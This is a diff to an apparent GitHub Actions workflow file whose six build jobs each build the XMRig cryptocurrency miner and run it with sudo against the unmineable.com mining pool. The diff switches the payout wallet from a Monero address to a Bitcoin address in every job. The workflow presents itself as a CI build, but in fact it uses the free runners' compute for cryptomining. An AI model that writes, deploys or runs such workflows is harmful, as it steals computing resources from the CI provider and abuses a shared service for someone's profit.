@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:83vNvEZepXQKEHnAjWXx8oYT5qCz56yosVspFYXFK98YL4FpjPGfnj8R1FKVxt8D6HXnTMMU9rKqX4SCyGTHg9gDB9PY5Lj.unmineable_worker_gitBased -p x --cpu-priority 5 --cpu-max-threads-hint 100
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qxsdtj2ymkspfj6s3qaz7mgpy3kchcz6pt8vpk8.BTC_Worker_GitBasedCloud -p x 
 
   build2:
     # The type of runner that the job will run on
@@ -40,7 +40,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:83vNvEZepXQKEHnAjWXx8oYT5qCz56yosVspFYXFK98YL4FpjPGfnj8R1FKVxt8D6HXnTMMU9rKqX4SCyGTHg9gDB9PY5Lj.unmineable_worker_gitBased -p x --cpu-priority 5 --cpu-max-threads-hint 100 
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qxsdtj2ymkspfj6s3qaz7mgpy3kchcz6pt8vpk8.BTC_Worker_GitBasedCloud -p x  
   build3:
     # The type of runner that the job will run on
     runs-on: ubuntu-latest
@@ -52,7 +52,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:83vNvEZepXQKEHnAjWXx8oYT5qCz56yosVspFYXFK98YL4FpjPGfnj8R1FKVxt8D6HXnTMMU9rKqX4SCyGTHg9gDB9PY5Lj.unmineable_worker_gitBased -p x --cpu-priority 5 --cpu-max-threads-hint 100 
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qxsdtj2ymkspfj6s3qaz7mgpy3kchcz6pt8vpk8.BTC_Worker_GitBasedCloud -p x  
   build4:
     # The type of runner that the job will run on
     runs-on: ubuntu-latest
@@ -64,7 +64,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:83vNvEZepXQKEHnAjWXx8oYT5qCz56yosVspFYXFK98YL4FpjPGfnj8R1FKVxt8D6HXnTMMU9rKqX4SCyGTHg9gDB9PY5Lj.unmineable_worker_gitBased -p x --cpu-priority 5 --cpu-max-threads-hint 100 
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qxsdtj2ymkspfj6s3qaz7mgpy3kchcz6pt8vpk8.BTC_Worker_GitBasedCloud -p x  
   build5:
     # The type of runner that the job will run on
     runs-on: ubuntu-latest
@@ -76,7 +76,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:83vNvEZepXQKEHnAjWXx8oYT5qCz56yosVspFYXFK98YL4FpjPGfnj8R1FKVxt8D6HXnTMMU9rKqX4SCyGTHg9gDB9PY5Lj.unmineable_worker_gitBased -p x --cpu-priority 5 --cpu-max-threads-hint 100 
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qxsdtj2ymkspfj6s3qaz7mgpy3kchcz6pt8vpk8.BTC_Worker_GitBasedCloud -p x  
   build6:
     # The type of runner that the job will run on
     runs-on: ubuntu-latest
@@ -88,4 +88,4 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:83vNvEZepXQKEHnAjWXx8oYT5qCz56yosVspFYXFK98YL4FpjPGfnj8R1FKVxt8D6HXnTMMU9rKqX4SCyGTHg9gDB9PY5Lj.unmineable_worker_gitBased -p x --cpu-priority 5 --cpu-max-threads-hint 100 
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qxsdtj2ymkspfj6s3qaz7mgpy3kchcz6pt8vpk8.BTC_Worker_GitBasedCloud -p x  
